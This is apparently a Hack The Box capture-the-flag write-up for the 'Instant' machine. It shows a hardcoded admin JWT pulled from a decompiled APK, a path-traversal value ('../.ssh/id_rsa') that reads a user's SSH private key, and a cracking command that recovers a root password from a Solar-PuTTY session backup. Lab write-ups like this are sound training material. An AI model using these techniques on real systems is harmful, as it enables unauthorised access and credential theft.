---
title: "HTB: Instant"
author: "v3l1d"
date: "2024-11-29"
year: "2024"
---

![](attachment/504cbbbf52112e416f8f6f16a708a590.png)

### Port Scanning

```r
nmap -sC -sV -A -T4 -o port_scan 10.10.11.37
Nmap scan report for 10.10.11.37
Host is up (0.055s latency).
Not shown: 998 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 9.6p1 Ubuntu 3ubuntu13.5 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 31:83:eb:9f:15:f8:40:a5:04:9c:cb:3f:f6:ec:49:76 (ECDSA)
|_  256 6f:66:03:47:0e:8a:e0:03:97:67:5b:41:cf:e2:c7:c7 (ED25519)
80/tcp open  http    Apache httpd 2.4.58
|_http-server-header: Apache/2.4.58 (Ubuntu)
|_http-title: Did not follow redirect to http://instant.htb/
Device type: general purpose
Running: Linux 5.X
OS CPE: cpe:/o:linux:linux_kernel:5.0
OS details: Linux 5.0
Network Distance: 2 hops
Service Info: Host: instant.htb; OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE (using port 993/tcp)
HOP RTT      ADDRESS
1   54.27 ms 10.10.14.1
2   54.47 ms 10.10.11.37
```

### APK Analysis

![](attachment/77a9ed10882f906d9e25817c321e1a2e.png)

Download **instant.apk** and open it through **JADX**

![](attachment/b4a3310b3d9a6c37b48ea5abceb16cb5.png)

Is signed an API: **/api/v1/view/profile** associated to **mywalletv1.instant.htb**, add this subdomain to **/etc/hosts/**. In the autorhization header we have a JWT Token:

```r
eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.**********
```

Try to contact the API providing the JWT token:

![](attachment/56e479b5143e43554b43834fd47bfbb9.png)

```HTTP
HTTP/1.1 200 OK
Date: Wed, 27 Nov 2024 10:57:42 GMT
Server: Werkzeug/3.0.3 Python/3.12.3
Content-Type: application/json
Content-Length: 236
Keep-Alive: timeout=5, max=100
Connection: Keep-Alive

{
   "Profile":{
      "account_status":"active",
      "email":"admin@instant.htb",
      "invite_token":"instant_admin_inv",
      "role":"Admin",
      "username":"instantAdmin",
      "wallet_balance":"10000000",
      "wallet_id":"f0eca6e5-783a-471d-9d8f-0162cbc900db"
   },
   "Status":200
}

```

Looking deeper in apk's source code:

![](attachment/7d59b53a5de20dba595454f9a5901146.png)

Let's add this domain to /etc/hosts and we'll get the accesso to swagger-ui:

![](attachment/ed549b0eaba7fc96a67fd26e5c7731c9.png)

As we can see some apis are locked, but we can unlock them using the JWT token found in the source code of the **apk**:

![](attachment/fe72cdf91a5b8d6dcd7bd6dc3da5e0a1.png)

By clicking on **Authorize** button we'll be able to unlock all apis in the swagger and going under **Logs** section:

![](attachment/6489e7b31d07142da4ac3bc60e46f79c.png)

Through the api: **/api/v1/admin/read/log?log_file_name=1.log** we are able read files' content:

![](attachment/60bc89f506fcfa153688152cd7e10220.png)

Pass the request in Burp and try include sensible files. Injecting **../.ssh/id_rsa** into **log_file_name** parameter we are able to read **shirohige**'s SSH private key:

![](attachment/993417cd9496bbef357fc9255d4f6fbd.png)
### Initial Access

Let's fix the **id_rsa**'s format in VSCode replacing all spaces and useless characters:

![](attachment/e12537eb0b597dd64c4c0a5e4ce4e79d.png)

Fix **id_rsa** permission and use to break in shirohige's SSH:

```r
-----BEGIN OPENSSH PRIVATE KEY-----
    b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAABlwAAAAdzc2gtcn
    .....
    -----END OPENSSH PRIVATE KEY-----
```

```r
┌──(kali㉿kali)-[~/HTB/Instant]
└─$ chmod 600 id_rsa
```

![](attachment/5b44635c699b9705e3761a3c36bd4d30.png)

```shell
userflag:092473a67eb7a**********
```

### Privilege Escalation

I ran **LinPeas** looking for something allowing privesc and it found:

![](attachment/b90c5fb4b8b4274ba018f5e25047a1a3.png)

I downloaded **instant.db** and opened it through [SQLite Viewer](https://inloop.github.io/sqlite-viewer/) :

![](attachment/29d32cfb01b73d9c2ed2f526d23dfa0f.png)

I tried to crack vanessa's and admin's passwords, but didn't succeeded. Going back to linpeas output i noted that there is a file in **/opt/backups/Solar-PuTTY**:

![](attachment/10b16d0c87ad2586375ca7870f252738.png)

Analyzing file content we have:

![](attachment/7f7056b0fe0d1e977c4f46457cf01cd4.png)

It seems to be a sessions backup file from SolarPuTTY, which may contains useful information about SSH sessions, such as usernames or passwords. After a long research on google i found two useful tools to crack thi **.dat**:

-[SolarPuttyCracker](https://github.com/Ak4izZ/SolarPuttyCracker) for Linux
-[SolarPuTTYDecrypt](https://github.com/VoidSec/SolarPuttyDecrypt/tree/master) for Windows

I used the first one:

```r
┌──(SolarPuttyCracker-HSs_2f3g)─(kali㉿kali)-[~/HTB/Alert/SolarPuttyCracker]
└─$ python3 SolarPuttyCracker.py ../sessions-backup.dat -o ../sessions_cracked -w /usr/share/wordlists/rockyou.txt 
```

After running the command, in the output file we'll get all SSH sessions, with clear credentials, including root password:

![](attachment/31a58751d6d2385c5aa1fecde806e4d7.png)


```json
{
    "Sessions": [
        {
            "Id": "066894ee-635c-4578-86d0-d36d4838115b",
            "Ip": "10.10.11.37",
            "Port": 22,
            "ConnectionType": 1,
            "SessionName": "Instant",
            "Authentication": 0,
            "CredentialsID": "452ed919-530e-419b-b721-da76cbe8ed04",
            "AuthenticateScript": "00000000-0000-0000-0000-000000000000",
            "LastTimeOpen": "0001-01-01T00:00:00",
            "OpenCounter": 1,
            "SerialLine": null,
            "Speed": 0,
            "Color": "#FF176998",
            "TelnetConnectionWaitSeconds": 1,
            "LoggingEnabled": false,
            "RemoteDirectory": ""
        }
    ],
    "Credentials": [
        {
            "Id": "452ed919-530e-419b-b721-da76cbe8ed04",
            "CredentialsName": "instant-root",
            "Username": "root",
            "Password": "**********",
            "PrivateKeyPath": "",
            "Passphrase": "",
            "PrivateKeyContent": null
        }
    ],
    "AuthScript": [],
    "Groups": [],
    "Tunnels": [],
    "LogsFolderDestination": "C:\\ProgramData\\SolarWinds\\Logs\\Solar-PuTTY\\SessionLogs"
}                                 
```

Use contained root password to login in it and catch the flag:

![](attachment/84594a655a1f071ca4fbed41ef516d6a.png)

```shell
rootflag:727938c0341**********
```






